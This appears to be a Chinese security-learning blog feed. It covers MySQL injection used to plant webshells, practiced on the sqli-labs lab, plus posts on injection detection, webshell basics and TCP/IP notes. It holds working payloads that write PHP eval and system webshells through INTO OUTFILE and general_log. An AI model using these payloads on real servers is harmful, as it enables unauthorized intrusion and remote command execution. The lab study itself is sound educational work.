<pre><code class="language-mysql">SELECT 列名 FROM table [WHERE 语句] INTO OUTFILE '目标文件'[OPTIONS]
</code></pre>
<p><code>SELECT</code>语句查询出所需数据，然后将其导出到<code>目标文件</code>中，<code>OPTIONS</code>为可选参数，常用值如下：</p>
<ul>
<li>FIELDS TERMINATED BY '字符串'：为字段之间设置字符串作为分隔符</li>
<li>COLUMNS TERMINATED BY '字符串'：为列之间设置字符串作为分隔符</li>
<li>LINES TERMINATED BY '字符串'：为每行数据结尾设置字符串</li>
<li>LINES STARTING BY '字符串'：为每行数据开头设置字符串</li>
</ul>
<h3 id="环境条件">环境条件</h3>
<blockquote>
<p>注入点：select注入点</p>
<p>数据库用户：File权限</p>
<p>secure_file_priv：支持web目录文件导出</p>
<p>物理路径：'G:/Tools/phpstudy_pro/WWW/sqli-labs/'</p>
<p>数据库和Web服务器在同一台服务器上</p>
</blockquote>
<ul>
<li><strong>File权限</strong></li>
</ul>
<p>指的是数据库用户能否对服务器主机上的文件进行读写操作，这样才可以执行select into outfile，load data infile操作。</p>
<ul>
<li><strong>secure_file_priv</strong></li>
</ul>
<p>secure-file-priv是mysql的新特性，用来限制对读写文件的权限，即规定了select into outfile，load data infile操作的目录。</p>
<p>通过以下命令可以查看secure-file-priv的值：</p>
<pre><code class="language-sql">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;secure-file-priv;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603850118588.png" alt="" loading="lazy"></figure>
<p>目前环境下的值为NULL，即不允许导入导出。</p>
<p>经查资料，secure-file-priv的值的：</p>
<p>（1）NULL，表示禁止。</p>
<p>（2）如果value值有文件夹目录，则表示只允许该目录下文件（PS：测试子目录也不行）。</p>
<p>（3）如果为空，则表示不限制目录。</p>
<p>可以在mysql的配置文件中（Windows下为my.ini, Linux下的my.cnf），修改值（如果没有就自己加上）。这里直接设置为不限制目录，然后重启数据库：</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603850125437.png" alt="" loading="lazy"></figure>
<p>这里踩了很久的坑，使用phpstudy的mysql，如果直接用Windows的笔记本打开my.ini，会导致后续数据库启动失败。</p>
<p>然后查看是否修改成功：</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603850131228.png" alt="" loading="lazy"></figure>
<h2 id="getshell">Getshell</h2>
<h3 id="1-利用-union-select">1、利用 union select</h3>
<p>当注入点为<code>union注入</code>时，利用 union select &quot;一句话木马&quot; into outfile '物理路径/xxx.php'，将一句话导出到xxx.php中。</p>
<pre><code class="language-php">?id=1 union select 1,&quot;&lt;?php @eval($_POST['passwd']);?&gt;&quot;,3 into outfile 'G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php'--
?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile &quot;G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php&quot;--
</code></pre>
<h3 id="2-利用-opetions分隔符">2、利用 OPETIONS（分隔符）</h3>
<p>当Mysql注入点为<code>盲注</code>或<code>报错注入</code>时，union select 的写入方式不可行。</p>
<p>通过添加OPTIONS直接在Sql语句后面写入一句话（常用的四种都可使用）：</p>
<pre><code class="language-mysql">?id=1 LIMIT 0,1 INTO OUTFILE 'G:/Tools/phpstudy_pro/WWW/sqli-labs/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
</code></pre>
<h3 id="3-日志getshell">3、日志getshell</h3>
<p>新版本的MySQL设置了secure_file_priv导出文件的路径，所以无法通过使用select into outfile来写入一句话。也很难去修改Mysql的配置文件。</p>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1603850170057.png" alt="" loading="lazy"></figure>
<p>该环境下还可以通过修改MySQL的log文件来获取Webshell。当开启日志后，Mysql会记录执行的SQL语句，通过把Webshell写入日志的方式来利用。</p>
<ul>
<li>
<p>环境条件：</p>
<p>数据库用户：<code>Super</code>和<code>File</code>服务器权限</p>
<p>物理路径：G:/Tools/phpstudy_pro/WWW/log.php</p>
</li>
<li>
<p>步骤</p>
<p>连接上Mysql后，执行如下命令：</p>
<pre><code class="language-mysql">//1、查询日志情况：
show variables like '%general%';   
//2、开启日志general log：
set global general_log = on;
//3、设置日志路径
set global general_log_file = 'G:/Tools/phpstudy_pro/WWW/webshell.php';
//4、写Webshell
select '&lt;?php eval($_GET[passwd]);?&gt;'             
//5、关闭日志
set global general_log=off;                  
</code></pre>
</li>
</ul>
<h2 id="靶场练习">靶场练习</h2>
<h3 id="1-环境搭建">1、环境搭建</h3>
<blockquote>
<p>靶场：https://github.com/Audi-1/sqli-labs</p>
<p>环境：phpstudy集成环境（Windows + Mysql + php + Apache）</p>
<p>数据库连接用户：root</p>
<p>secure_file_priv：secure_file_priv =</p>
</blockquote>
<p>此外在靶场网站路径下准备一个phpinfo.php（获取网站绝对路径使用）</p>
<h3 id="2-测试">2、测试</h3>
<p>注入点如下：</p>
<pre><code class="language-html+php">http://192.168.31.128/sqli-labs/Less-1/?id=1
</code></pre>
<p>进行简单的sql注入检测：</p>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1603850422253.png" alt="" loading="lazy"></figure>
<p>通过单引号触发sql语法报错，得到以下信息：</p>
<ul>
<li>Mysql数据库</li>
<li>参数是单引号闭合</li>
</ul>
<p>进一步通过布尔逻辑来验证注入点：</p>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1603850428657.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1603850432457.png" alt="" loading="lazy"></figure>
<p>证实该注入点的存在。</p>
<p>有明显的数据回显，先试一试union注入是否可以：</p>
<ul>
<li>order by 测试字段数</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1603850439217.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1603850444296.png" alt="" loading="lazy"></figure>
<p>字段3排序正常，字段4报错，可以得出数据库表有三个字段。</p>
<ul>
<li>
<p>union select 测试回显字段是多少</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=-1' union select 1,2,3--+
</code></pre>
</li>
</ul>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1603850451054.png" alt="" loading="lazy"></figure>
<p>可以看出回显到前端的字段是2和3。</p>
<p>因为是练习Getshell，就不进行后续的数据爆破。为了Getshell，需要先收集目标相关的信息，通过上面的报错我们了解到目标数据库为Mysql，下面利用Mysql的一些系统函数来收集一些信息：</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=-1' union select 1,concat_ws(',',user(),@@version_compile_os),3--+
</code></pre>
<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1603850456910.png" alt="" loading="lazy"></figure>
<p>得到信息如下：</p>
<ul>
<li>数据库连接用户：root （权限够了）</li>
<li>操作系统：Windows</li>
</ul>
<p>目前为止，还差网站的绝对路径，可以通过报错，phpinfo界面，404界面等一些方式去搜集。</p>
<p>这里用burpsuite扫一下目录，发现了phpinfo：</p>
<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1603850462487.png" alt="" loading="lazy"></figure>
<p>然后打开就能收集到网站绝对路径了：</p>
<p><img src="https://zzggtt.github.io/post-images/1603850466908.png" alt="" loading="lazy"><br>
至此Getshell所需的信息基本搜集的差不多了。</p>
<p>Getshell：</p>
<pre><code class="language-php+HTML">http://192.168.31.128/sqli-labs/Less-1/?id=1' union select 1,&quot;&lt;?php @eval($_POST['passwd']);?&gt;&quot;,3 into outfile 'G:/Tools/phpstudy_pro/WWW/sqli-labs/webshell.php'--+
</code></pre>
<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1603850471556.png" alt="" loading="lazy"></figure>
<p>使用Webshell管理工具连接：</p>
<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1603850475512.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1603850478921.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Mysql手工注入检测和基础函数]]></title>
        <id>https://zzggtt.github.io/post/mysql-shou-gong-zhu-ru-jian-ce-he-ji-chu-han-shu/</id>
        <link href="https://zzggtt.github.io/post/mysql-shou-gong-zhu-ru-jian-ce-he-ji-chu-han-shu/">
        </link>
        <updated>2020-10-28T01:00:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="注入检测">注入检测</h2>
<h3 id="一-mysql基础">一、Mysql基础</h3>
<p>Mysql的逻辑架构图：</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603847821786.png" alt="" loading="lazy"></figure>
<p>下面的内容采用如下源码进行分析：</p>
<pre><code class="language-php">//源码（sqli-labs）:
$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
</code></pre>
<pre><code class="language-mysql">//对应的sql语句 :
SELECT * FROM users WHERE id='1'' LIMIT 0,1
</code></pre>
<ul>
<li>
<p><strong>分析器</strong></p>
<blockquote>
<p>MySQL的<code>分析器</code>从输入的&quot;select&quot;这个关键字识别出来，这是一个查询语句。它也要把字符串“T”识别成“表名T”，把字符串“ID”识别成“列ID”。做完了这些识别以后，就要做“语法分析”。根据词法分析的结果，语法分析器会根据语法规则，判断你输入的这个SQL语句是否满足MySQL语法。如果你的语句不对，就会收到“You have an error in your SQL syntax”的错误提醒。</p>
</blockquote>
<p>举个例子：比如下面这个语句select少打了开头的字母“s”</p>
</li>
</ul>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603847829863.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>执行器</strong></p>
<blockquote>
<p>MySQL通过分析器知道了你要做什么，通过优化器知道了该怎么做，于是就进入了<code>执行器</code>阶段，开始执行语句。</p>
</blockquote>
</li>
<li>
<p><strong>Mysql 逻辑与或运算</strong></p>
<blockquote>
<p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p>
<p>参考：https://www.runoob.com/mysql/mysql-operator.html</p>
<p>我自己的理解：</p>
<ul>
<li>AND：一假即假</li>
<li>OR：一真即真</li>
</ul>
</blockquote>
<p>自己多实践一些例子就能理解：</p>
<p>user表结构：</p>
</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603847836492.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1603847842382.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1603847849079.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1603847853628.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1603847858045.png" alt="" loading="lazy"></figure>
<h3 id="二-触发mysql语法错误-检测注入">二、触发mysql语法错误 检测注入</h3>
<p>常见的通过触发语法错误来检测注入的方式（是否成对匹配）：</p>
<table>
<thead>
<tr>
<th>'</th>
<th>False</th>
</tr>
</thead>
<tbody>
<tr>
<td>''</td>
<td>True</td>
</tr>
<tr>
<td>&quot;</td>
<td>False</td>
</tr>
<tr>
<td>&quot;&quot;</td>
<td>True</td>
</tr>
<tr>
<td>\</td>
<td>False</td>
</tr>
<tr>
<td>\</td>
<td>True</td>
</tr>
</tbody>
</table>
<pre><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=1'
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1603848340972.png" alt="" loading="lazy"></figure>
<pre><code class="language-my">http://127.0.0.1/sqli-labs/Less-1/?id=1\
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1603848346568.png" alt="" loading="lazy"></figure>
<pre><code class="language-mysql">http://127.0.0.1/sqli-labs/Less-1/?id=1&quot;
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1603848351890.png" alt="" loading="lazy"></figure>
<h3 id="三-通过逻辑运算-检测注入">三、通过逻辑运算 检测注入</h3>
<p>以如下SQL语句为例：</p>
<pre><code class="language-mysql">SELECT * FROM users WHERE id = 1;
</code></pre>
<table>
<thead>
<tr>
<th>AND 1</th>
<th>True</th>
</tr>
</thead>
<tbody>
<tr>
<td>AND 0</td>
<td>False</td>
</tr>
<tr>
<td>id=3-1</td>
<td>返回2的数据即为True</td>
</tr>
<tr>
<td>id=1*3</td>
<td>返回3的数据即为True</td>
</tr>
</tbody>
</table>
<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1603848358428.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1603848362778.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1603848366369.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1603848371231.png" alt="" loading="lazy"></figure>
<h2 id="基础函数">基础函数</h2>
<h3 id="mysql常用系统函数">Mysql常用系统函数</h3>
<blockquote>
<p>version()            #MySQL版本<br>
user()               #数据库用户名<br>
database()           #数据库名<br>
@@datadir            #数据库路径<br>
@@version_compile_os #操作系统版本</p>
</blockquote>
<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1603848377306.png" alt="" loading="lazy"></figure>
<h3 id="mysql连接函数">Mysql连接函数</h3>
<blockquote>
<p>函数具体介绍以及使用，参考：https://www.cnblogs.com/lcamry/p/5715634.html</p>
</blockquote>
<p>当我们使用union注入去获取数据库相关数据时，由于union select的特性，获取一条数据时不会又太大影响，例如：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='1' UNION SELECT 1,user(),3
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://zzggtt.github.io/post-images/1603848383577.png" alt="" loading="lazy"></figure>
<p>但是想要获取多条数据时，例如：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='1' UNION SELECT 1,schema_name,3 FROM information_schema.SCHEMATA
</code></pre>
<figure data-type="image" tabindex="17"><img src="https://zzggtt.github.io/post-images/1603848390763.png" alt="" loading="lazy"></figure>
<p>以sqli-labs靶场源码为例，通常服务端是这样写的：</p>
<pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
$result=mysqli_query($con1, $sql);
</code></pre>
<p>结果就是这样的：</p>
<figure data-type="image" tabindex="18"><img src="https://zzggtt.github.io/post-images/1603848396222.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://zzggtt.github.io/post-images/1603848400663.png" alt="" loading="lazy"></figure>
<p>就只能爆出LIMIT 0,1 的数据。</p>
<p>所以通过使用连接函数来爆破多条数据：</p>
<pre><code class="language-sql">SELECT * FROM users WHERE id='-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.SCHEMATA LIMIT 0,1
</code></pre>
<figure data-type="image" tabindex="20"><img src="https://zzggtt.github.io/post-images/1603848406039.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://zzggtt.github.io/post-images/1603848410717.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[初识Webshell]]></title>
        <id>https://zzggtt.github.io/post/chu-shi-webshell/</id>
        <link href="https://zzggtt.github.io/post/chu-shi-webshell/">
        </link>
        <updated>2020-10-28T00:50:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="webshell">Webshell</h2>
<h3 id="1-shell">1、Shell</h3>
<p><strong>Shell</strong>是一个 <code>命令解释器</code> ：用于接收使用者输入的指令，并送入内核去执行。解释使用者输入的指令。是一种为使用者提供操作界面的软件。</p>
<p>基本上分为两大类：</p>
<ul>
<li>
<p>图像界面shell</p>
<p>应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
</li>
<li>
<p>命令式shell</p>
<p>Unix/linux 系统：bash / sh / ksh / csh / zsh</p>
<p>Winodws系统：cmd.exe、PowerShell</p>
</li>
</ul>
<h3 id="2-webshell">2、Webshell</h3>
<p><strong>Webshell</strong>是一种Web形式的命令解释器，以asp、jsp、php或者cgi等动态脚本语言编写一种<code>执行系统代码</code>的环境。通过浏览器访问网站服务器Web目录下的Webshell，输入指令，来达到管理目标网站的服务器。</p>
<p>以最简单的php webshell为例：</p>
<pre><code class="language-php">&lt;?php
    system($_GET('command'));
?&gt;
</code></pre>
<p>通过GET方式comand参数来接收传递命令，然后交由system函数执行命令。</p>
<h3 id="3-webshell分类">3、Webshell分类</h3>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603846217988.png" alt="" loading="lazy"></figure>
<h3 id="4-webshell管理工具">4、Webshell管理工具</h3>
<p>在以前菜刀没有出现的时候，我们想要获取 webshell 的时候，通常都是直接上传一个 web 木马并且直接用这个木马进行管理，由于这种大型木马的体量比较大，上传过程中容易被检测且不方便进行上传绕过测试，所以大家就想了一个办法，先上传一个体量小，功能少的小型木马然后再通过小马的简单的上传或者文件修改等单个功能进行大马的上传。小马的功能通常是围绕文件管理的功能，比较简单，如：文件上传、文件修改、新建文件等，都是围绕方便上传一个体量大的木马来做的。自从菜刀出现之后，渐渐的一句话木马成为了主流，体量小，还有一个界面版的客户端进行管理操作，极大的方便的大家对于 web 服务器的管理。</p>
<p>上传完大马后，直接访问对应位置即可进行相应管理：</p>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603846222969.png" alt="" loading="lazy"></figure>
<p>而一句话木马则提供了一个界面版的客户端进行管理操作，极大的方便的大家对于Web服务器的管理：</p>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603846229853.png" alt="" loading="lazy"></figure>
<p>常见的Webshell管理工具：https://www.cnblogs.com/xiaozi/p/12397211.html</p>
<p>参考：https://mp.weixin.qq.com/s/x2Tw3ukaTFDJvZ0YCuZBog</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[《图解TCP/IP》读书笔记]]></title>
        <id>https://zzggtt.github.io/post/lesslesstu-jie-tcpipgreatergreater-du-shu-bi-ji/</id>
        <link href="https://zzggtt.github.io/post/lesslesstu-jie-tcpipgreatergreater-du-shu-bi-ji/">
        </link>
        <updated>2020-10-08T08:56:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="前言">前言</h3>
<p>了解TCP/IP是对渗透测试很有必要的，下面是我阅读完《图解TCP/IP》后，记录的一些重要的知识点。</p>
<p>（随着我的渗透测试学习，将会持续更新！！！）</p>
<h3 id="tcpip概述">TCP/IP概述</h3>
<h4 id="1-含义">1、含义</h4>
<p>互联网在进行通信时，需要相应的网络协议，而在网络中被广泛使用的TCP/IP协议。TCP/IP协议在多数情况下指的是：利用IP进行通信时所必须用到的协议群的统称。</p>
<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1603526064488.png" alt="" loading="lazy"></figure>
<h4 id="2-分层模型">2、分层模型</h4>
<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1603526073786.png" alt="" loading="lazy"></figure>
<p>OSI参考模型注重“通信协议必要的功能是什么”，而TCP/IP则更强调“在计算机上实现协议应该开放哪种程序”</p>
<ul>
<li>
<p><strong>硬件层</strong></p>
<p>TCP/IP的最底层的主要作用是负责数据传递的硬件。</p>
</li>
<li>
<p><strong>网卡层</strong></p>
<p>网卡层也称网络接口层，可以理解为“驱动程序”。它是硬件与操作系统之间的桥梁。计算机的外设不是直接插上就能使用的，还需要“驱动程序”的支持。所以通常需要在操作系统上安装一些<code>驱动程序软件</code>，才能使用这些附加硬件。</p>
</li>
<li>
<p><strong>互联网层</strong></p>
<p>互联网层使用IP协议，IP协基于IP地址转发分发数据。</p>
</li>
</ul>
<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1603526079889.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>传输层</strong></p>
<p>传输层的主要功能是让应用程序软件之间实现通信，它具有来个代表性的协议：TCP、UDP。</p>
</li>
</ul>
<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1603526084292.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>应用层</strong></p>
<p>TCP/IP的应用层把OSI参考模型中的会话层、表示层、应用层的功能都集中到<code>应用程序软件</code>中来实现。TCP/IP应用的架构绝大数属于<code>C/S架构</code>。</p>
<p>提供服务的应用程序叫做服务端，接收服务的应用程序叫做客户端。在这种通信模式中，提供服务的程序会被预先部署到<code>服务器主机</code>上，等待接收任何时刻客户端发送的请求。</p>
</li>
</ul>
<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1603526090062.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>WWW</p>
<p>在WWW中，用户通过Web浏览器（客户端），就可以访问存储在Web服务器上的各种信息。Web浏览器和Web服务器之间的通信协议是<code>HTTP</code>（应用层协议），所传输的数据的主要格式是<code>HTML</code>（表示层协议）。</p>
</li>
</ul>
<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1603526103650.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>电子邮件</p>
<p>电子邮件之在网络上发送邮件，发送邮件的通信协议是<code>SMPT</code>（应用层协议）。起初只能发送文本格式，然而现在电子邮件由MIME协议（表示层协议）拓展后，就可以发送声音、图片等各式各样的信息。</p>
</li>
</ul>
<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1603526113007.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>文件传输</p>
<p>文件传输协议是指将保存在其他计算机硬盘上的文件传输到本地硬盘上，该过程使用的协议是<code>FTP</code>。</p>
</li>
</ul>
<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1603526118579.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p>远程登陆</p>
<p>远程登陆指的是登录到远程的计算机上。在TCP/IP中常用<code>TELNET</code>和<code>SSH</code>两种协议。</p>
</li>
</ul>
<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1603526123676.png" alt="" loading="lazy"></figure>
<h4 id="3-通信示例">3、通信示例</h4>
<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1603526128849.png" alt="" loading="lazy"></figure>
<h3 id="地址的唯一性">地址的唯一性</h3>
<blockquote>
<p>在TCP/IP或UDP/IP通信中，通常采用5个信息来识别一个通信。分别是：“源IP地址”、“目标IP地址”、“协议号”、“源端口地址”、“目标端口地址”。</p>
</blockquote>
<h4 id="基础概念">基础概念</h4>
<ul>
<li>
<p>端口</p>
<p>在传输层中，用于识别一台计算机中正在运行的不同的应用程序。</p>
</li>
<li>
<p>IP地址</p>
<p>在网络层中，用于识别TCP/IP网络中互联的主机和路由器。</p>
</li>
<li>
<p>MAC地址</p>
<p>在数据链层路中，用于是被同一链路中不同的计算机。</p>
</li>
</ul>
<h4 id="端口">端口</h4>
<p>一台计算机中可以同时运行多个应用程序，例如Web浏览器、远程登陆用的SSH客户端等待。而传输层协议（TCP、UDP）正式利用端口号来<code>识别不同的应用程序</code>，并准确的将<code>数据传输</code>。</p>
<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1603546021942.png" alt="" loading="lazy"></figure>
<p>常见的端口对应的服务：https://www.shentoushi.top/Public/upload/images/2017-07-09/Baidu_translation_table.png</p>
<h4 id="ip地址">IP地址</h4>
<p>IP协议作为整个TCP/IP中至关重要的协议，主要作用是在复杂的网络环境中将<code>数据包发送</code>给最终的目标计算机。能够让任意两台计算机之间进行通讯。</p>
<p>在TCP/IP通信中，所有主机或路由器必须设定IP地址。IP地址的作用在于从连接到互联网中的所有主机中，<code>识别</code>出进行通信的目标地址。</p>
<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1603546036787.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>组成</strong></p>
<p>IP地址由<code>“网络地址”</code>和<code>“主机地址”</code>两部分组成。</p>
<p>网络地址代表<code>不同的网段</code>，而主机地址代表同一网段中的<code>不同的主机</code>。</p>
</li>
</ul>
<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1603546042612.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1603546047304.png" alt="" loading="lazy"></figure>
<ul>
<li><strong>分类</strong></li>
</ul>
<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1603546053182.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://zzggtt.github.io/post-images/1603546080736.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>全局地址和私有地址</strong></p>
<p>随着互联网的普及，IP地址不足的问题日趋显著，于是出现了一种技术：在每个独立的网络中，只为相应的设备分配唯一的IP地址，对于哪些没有连接尽互联网中的主机，只需要保证在整个独立的网络中地址唯一即可。</p>
<p>这些地址称为私有地址，范围如下：</p>
</li>
</ul>
<figure data-type="image" tabindex="17"><img src="https://zzggtt.github.io/post-images/1603546089041.png" alt="" loading="lazy"></figure>
<ul>
<li>
<p><strong>NAT技术</strong></p>
<p>私有IP地址最早没有计划连接互联网，而只是用于互联网之外的独立网络。然而随着NAT技术的出现，配置私有IP的主机也能与互联网中的主机进行通信。</p>
<p>NAT技术是一种能够互换私有IP地址与全局IP地址的技术。</p>
</li>
</ul>
<figure data-type="image" tabindex="18"><img src="https://zzggtt.github.io/post-images/1603546094513.png" alt="" loading="lazy"></figure>
<p>当独立网络内部有多台机器同时要与外部通讯时，仅仅转换IP地址是不够用的，此时采用包含端口号一起转换的方式（NAPT）即可解决。</p>
<figure data-type="image" tabindex="19"><img src="https://zzggtt.github.io/post-images/1603546098891.png" alt="" loading="lazy"></figure>
<h4 id="mac地址">MAC地址</h4>
<p>MAC地址用于识别数据链路中互连的节点。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[关于]]></title>
        <id>https://zzggtt.github.io/post/about/</id>
        <link href="https://zzggtt.github.io/post/about/">
        </link>
        <updated>2019-01-25T11:09:48.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>📝温故而知新</p>
</blockquote>
<h2 id="twitterhttpstwittercomzer0ney1">📒 twitter：https://twitter.com/Zer0ney1</h2>
<h2 id="wechatz807852704">📙 wechat：z807852704</h2>
]]></content>
    </entry>
</feed>